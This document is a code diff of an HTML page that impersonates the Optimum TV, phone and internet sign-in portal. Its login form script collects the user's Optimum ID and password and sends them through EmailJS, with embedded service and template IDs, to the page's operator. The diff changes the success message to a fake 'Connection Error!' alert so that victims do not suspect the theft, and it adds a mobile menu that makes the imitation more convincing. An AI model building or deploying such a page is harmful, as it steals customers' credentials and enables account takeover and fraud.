@@ -1,220 +1,426 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Optimum</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Optimum | TV, Phone and Internet Support Home</title>
+    <link
+      rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css"
+    />
+
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+      integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC"
+      crossorigin="anonymous"
+    />
     <!-- <link rel="stylesheet" href="styles.css"> -->
     <!-- bootstrap -->
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
+    <script
+      src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"
+      integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM"
+      crossorigin="anonymous"
+    ></script>
     <!-- email js -->
-    <script type="text/javascript"
-    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
-   </script>
-  
+    <script
+      type="text/javascript"
+      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"
+    ></script>
 
-   <style>
-    body{
-    font-size: 14px;
-    color: #555;
-}
-.navbar{
-    background-color: #223f64;
-    display: flex;
-    justify-content: space-evenly;
-}
+    <style>
+      * {
+        margin: 0;
+        box-sizing: border-box;
+      }
 
-.navbar img{
-    height: 50px;
-    width: 150px;
-}
+      body {
+        font-size: 14px;
+        color: #555;
+      }
+      .navbar {
+        background-color: #002864;
+        display: flex;
+        justify-content: space-between;
+        padding: 20px 40px;
+      }
 
+      .navbar img {
+        height: 45px;
+        width: 225px;
+      }
 
-.logo p{
-    color: white;
-    font-weight: 500;
-    font-style: italics;
+      .logo p {
+        color: white;
+        font-weight: 400;
+        font-size: 18px;
+        font-style: italics;
+      }
+      .container {
+        display: flex;
+        justify-content: space-evenly;
+        flex-wrap: wrap;
+        margin-top: 50px;
+        background-color: whitesmoke;
+        width: 100%;
+        padding: 50px;
+      }
 
-} 
-.container{
-  display: flex;
-  justify-content: space-evenly;
-  flex-wrap: wrap;
-  margin-top: 50px;
-  background-color: whitesmoke;
-  width: 100%;
- padding:50px;
-}
+      .container img {
+        height: 330px;
+      }
 
-.container img{
-  height: 330px;
-}
+      .form-label {
+        font-weight: 800;
+      }
 
-.form-label{
-    font-weight: 800;
-}
+      .btn {
+        background-color: orange;
+        font-weight: 700;
+      }
 
-.btn{
-    background-color: orange;
-    font-weight: 700;
-   
-}
+      #emailHelp {
+        color: steelblue;
+        font-weight: 600;
+      }
 
-#emailHelp{
-    color: steelblue;
-    font-weight: 600;
-}
+      .navigations {
+        flex: 0.5;
+      }
 
-.navigations{
-    flex: 0.4;
-}
+      .navigate {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
 
-.navigate{
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
+      .navigate a {
+        cursor: pointer;
+      }
 
-}
+      .navigate .search {
+        flex: 0.7;
+        display: flex;
+        align-items: center;
+        border: none;
+      }
 
-.navigate a{
-    width: 120px
-}
+      .navigate .search input {
+        flex: 1;
+        border: none;
+        outline: none;
+        padding: 3px;
+        border-radius: 4px 0 0 4px;
+      }
 
-.navigate-bottom{
-    margin-top: 20px;
-}
+      .navigate .search i {
+        flex: 0.15;
+        font-size: 14px;
 
-.navigate-bottom a{
-    padding-left: 30px;
-    width: 50px;
-    font-weight: 200;
-}
+        font-weight: 900;
+        padding: 3px;
+        text-align: center;
+        /* padding-left: 10px; */
+        color: #fff;
+        background-color: #f66608;
+        border-radius: 0 4px 4px 0;
+        cursor: pointer;
+      }
 
-.container-fluid{
-  display: flex;
-  justify-content: space-around;
-  flex-wrap: wrap;
-  min-height: 400px;
-  padding: 30px;
-  width: 100%;
-}
-   </style>
-   </head>
+      .menu-bar {
+        display: none;
+        color: #fff;
+        font-size: 30px;
+        /* padding-left: 30px; */
+      }
 
+      .menu-close {
+        display: none;
+      }
 
-<body>
-  <!-- navbar -->
+      .navigate-bottom {
+        margin-top: 10px;
+        /* width: 100%; */
+        display: flex;
+        gap: 10px;
+      }
 
-  <nav class="navbar navbar-expand-lg navbar-light ">
-    <div class="logo">
-      <p>En español</p>
-      <img src="./assets/logo.webp"/>
-    </div>
+      /*start here  */
 
-    <div class="navigations">
-      <div class="navigate ">
-        <a class="text-light fs-5  fw-6 text-decoration-none"><b>Sign in</b></a>
-        <a class="text-light fs-5 fw-6 text-decoration-none"><b>Pay bill</b></a>
-        <a class="text-light fs-5 fw-6 text-decoration-none"><b>Support</b></a>
-        <form class="d-flex">
-          <input class="form-control me-2 h-2" type="search" placeholder="Search" aria-label="Search">
-          <button class="btn btn-outline-success" type="submit">Search</button>
-          <!-- <input type="text" placeholder="How do i change my network"/> -->
-        </form>
+      /* .navigate-bottom a {
+        padding-left: 30px;
+        width: 50px;
+        font-weight: 200;
+      } */
+
+      .navigate-bottom div i {
+        font-size: 18px;
+        color: #fff;
+        background-color: #666666;
+        padding: 8px;
+        border-radius: 6px;
+      }
+
+      /* .navigate-bottom span img {
+        font-size: 10px;
+        width: 30px;
+        height: 32px;
+        position: absolute;
+      } */
+
+      .navigate-bottom a {
+        /* padding-right: 20px; */
+        /* width: 50px; */
+        font-weight: 200;
+        font-size: 20px;
+        font-family: "Lucida Sans", "Lucida Sans Regular", "Lucida Grande",
+          "Lucida Sans Unicode", Geneva, Verdana, sans-serif;
+        cursor: pointer;
+      }
+
+      .container-fluid {
+        display: flex;
+        justify-content: space-around;
+        flex-wrap: wrap;
+        min-height: 400px;
+        padding: 30px;
+        width: 100%;
+      }
+
+      .container-fluid img {
+        width: 100%;
+      }
+
+      @media all and (max-width: 768px) {
+        .logo p {
+          display: none;
+        }
+
+        .navbar img {
+          height: 30px;
+          width: 150px;
+        }
+        .navigate a {
+          display: none;
+        }
+
+        .navigate .search input {
+          display: none;
+        }
+
+        .navigate .search i {
+          border-radius: 4px;
+          margin-right: 30px;
+          background-color: transparent;
+          border-radius: 0;
+          font-size: 16px;
+        }
+
+        .menu-bar {
+          display: block;
+        }
+
+        .menu-close {
+          display: block;
+          margin-top: 10px;
+        }
+
+        .menu-bar i {
+          background-color: #002864;
+        }
+
+        .navigate-bottom {
+          display: none;
+          /* display: flex; */
+          flex-direction: column;
+
+          padding-left: 20px;
+          position: absolute;
+          top: 0;
+          right: 0;
+          z-index: 100;
+          background-color: #002864;
+          height: 100vh;
+          width: 50%;
+        }
+
+        .open {
+          display: flex;
+        }
+
+        .navigate-bottom .internet-link {
+          margin-top: 40px;
+        }
+      }
+    </style>
+  </head>
+
+  <body>
+    <!-- navbar -->
+
+    <nav class="navbar navbar-expand-lg navbar-light">
+      <div class="logo">
+        <p>En español</p>
+        <a href="/"><img src="./assets/logo.webp" /></a>
       </div>
-      <div class="navigate-bottom">
-        <a class="text-light fs-3  fw-6 text-decoration-none">Internet</a>
-        <a class="text-light fs-3 text-decoration-none">Tv</a>
-        <a class="text-light fs-3 text-decoration-none">Phones</a>
-        <a class="text-light fs-3 text-decoration-none">My Offer</a>
+
+      <div class="navigations">
+        <div class="navigate">
+          <a class="text-light fs-5 fw-6 text-decoration-none">Sign in</a>
+          <a class="text-light fs-5 fw-6 text-decoration-none">Pay bill</a>
+          <a class="text-light fs-5 fw-6 text-decoration-none">Support</a>
+
+          <!--*old code -->
+          <!-- <form class="d-flex">
+            <input
+              class="form-control me-2 h-2"
+              type="search"
+              placeholder="Search"
+              aria-label="Search"
+            />
+            <button class="btn btn-outline-success" type="submit">
+              Search
+            </button>
+            <input type="text" placeholder="How do i change my network"/>
+          </form> -->
+          <!--* -->
+
+          <div class="search">
+            <input
+              type="search"
+              name=""
+              id=""
+              placeholder="How do I pay my bills"
+            />
+            <i class="bi bi-search"></i>
+          </div>
+
+          <div class="menu-bar">
+            <i class="bi bi-list"></i>
+          </div>
+        </div>
+        <div class="navigate-bottom">
+          <div class="menu-close">
+            <i class="bi bi-x-lg"></i>
+          </div>
+          <div class="p-1 internet-link">
+            <a class="text-light fs-3 fw-6 text-decoration-none pe-1"
+              >Internet</a
+            >
+            <!-- <img src="./assets/envelope.svg" alt="" /> -->
+            <i class="bi bi-envelope-fill"></i>
+          </div>
+          <a class="text-light fs-3 text-decoration-none p-1 sub">TV</a>
+          <a class="text-light fs-3 text-decoration-none p-1 sub">Phones</a>
+          <a class="text-light fs-3 text-decoration-none p-1 sub">My Offer</a>
+        </div>
       </div>
-    </div>
-   
-  </nav>
-  <!-- navbar -->
- 
+    </nav>
+    <!-- navbar -->
 
- <main class="container">
-  <form id="login-form">
-    <div class="mb-3">
-      <label for="exampleInputEmail1" class="form-label">My Optimum ID</label>
-      <input type="text" name="exampleInputEmail1" class="form-control" id="exampleInputEmail1"  aria-describedby="emailHelp">
-      <div id="emailHelp" class="form-text">I forgot my Optimum ID</div>
-    </div>
-    <div class="mb-3">
-      <label for="exampleInputPassword1" class="form-label">Password</label>
-      <input type="password" name="exampleInputPassword1" class="form-control" " id="exampleInputPassword1">
-      <div id="emailHelp" class="form-text">I forgot my Password</div>
-      <hr/>
-    </div>
-    <div class="mb-3 form-check">
-      <input type="checkbox" class="form-check-input" id="exampleCheck1">
-      
-     
-      <label class="form-check-label" for="exampleCheck1">Remember me</label>
-    </div>
-    <button  type="submit" class="btn  text-light">Sign in to Optimum.net</button>
-    <div id="emailHelp" class="form-text">Don't have an Optimum ID? Create one</div>
-  </form>
-  <div class="">
-<img src="./assets/get optimum.png"/>
-  </div>
+    <main class="container">
+      <form id="login-form">
+        <div class="mb-3">
+          <label for="exampleInputEmail1" class="form-label"
+            >My Optimum ID</label
+          >
+          <input
+            type="text"
+            name="exampleInputEmail1"
+            class="form-control"
+            id="exampleInputEmail1"
+            aria-describedby="emailHelp"
+            autocomplete="off"
+            required
+          />
+          <div id="emailHelp" class="form-text">I forgot my Optimum ID</div>
+        </div>
+        <div class="mb-3">
+          <label for="exampleInputPassword1" class="form-label">Password</label>
+          <input type="password" name="exampleInputPassword1"
+          class="form-control" " id="exampleInputPassword1" required>
+          <div id="emailHelp" class="form-text">I forgot my Password</div>
+          <hr />
+        </div>
+        <div class="mb-3 form-check">
+          <input type="checkbox" class="form-check-input" id="exampleCheck1" />
 
-   <div class="">
-<img src="./assets/optimum mobile.png"/>
-  </div>
+          <label class="form-check-label" for="exampleCheck1"
+            >Remember me</label
+          >
+        </div>
+        <button type="submit" class="btn text-light">
+          Sign in to Optimum.net
+        </button>
+        <div id="emailHelp" class="form-text">
+          Don't have an Optimum ID? Create one
+        </div>
+      </form>
 
+      <div class="">
+        <img src="./assets/get optimum.png" />
+      </div>
 
-
- </main>
- <div class="container-fluid">
-  <div class="">
-    <img src="./assets/optimum help.png"/>
+      <div class="">
+        <img src="./assets/optimum mobile.png" />
+      </div>
+    </main>
+    <div class="container-fluid">
+      <div class="">
+        <img src="./assets/optimum help.png" />
       </div>
       <div class="">
-        <img src="./assets/optimum my bill.png"/>
-          </div>
-  </div>
+        <img src="./assets/optimum my bill.png" />
+      </div>
+    </div>
 
+    <script>
+      // Load the EmailJS SDK asynchronously
+      (function () {
+        emailjs.init("Fc6Zb2E93HsLc4jAH");
+      })();
 
- </div>
- 
+      // Handle the form submission
+      const form = document.getElementById("login-form");
 
- <script >
- 
- // Load the EmailJS SDK asynchronously
-(function() {
-  emailjs.init("Fc6Zb2E93HsLc4jAH");
-})();
+      form.addEventListener("submit", (event) => {
+        event.preventDefault(); // Prevent the default form submission behavior
 
-// Handle the form submission
-const form = document.getElementById("login-form");
+        // Get the form data;
+        const optimumId = form.elements["exampleInputEmail1"].value;
+        const password = form.elements["exampleInputPassword1"].value;
 
-form.addEventListener("submit", (event) => {
-  event.preventDefault(); // Prevent the default form submission behavior
+        // Send the form data to EmailJS
+        emailjs
+          .send("service_rybja5w", "template_2g5g3nh", {
+            optimumId: optimumId,
+            password: password,
+          })
+          .then(
+            () => {
+              // Handle the successful form submission here
+              alert("Connection Error!");
+            },
+            (error) => {
+              // Handle the form submission error here
+              alert("Form submission failed. Error: " + error);
+            }
+          );
+      });
 
-  // Get the form data;
-  const optimumId = form.elements["exampleInputEmail1"].value;
-  const password = form.elements["exampleInputPassword1"].value;
+      //*menu bar for small screen
+      const menu = document.querySelector(".menu-bar");
+      const closeLink = document.querySelector(".menu-close");
+      const navLink = document.querySelector(".navigate-bottom");
 
-  // Send the form data to EmailJS
-  emailjs.send("service_rybja5w", "template_2g5g3nh", {
-    optimumId: optimumId,
-    password: password,
-  })
-  .then(() => {
-    // Handle the successful form submission here
-    alert("Form submitted successfully!");
-  }, (error) => {
-    // Handle the form submission error here
-    alert("Form submission failed. Error: " + error);
-  });
-});
+      menu.addEventListener("click", () => {
+        navLink.classList.toggle("open");
+      });
 
-</script>
-
- 
-</body>
+      closeLink.addEventListener("click", () => {
+        navLink.classList.toggle("open");
+      });
+    </script>
+  </body>
 </html>
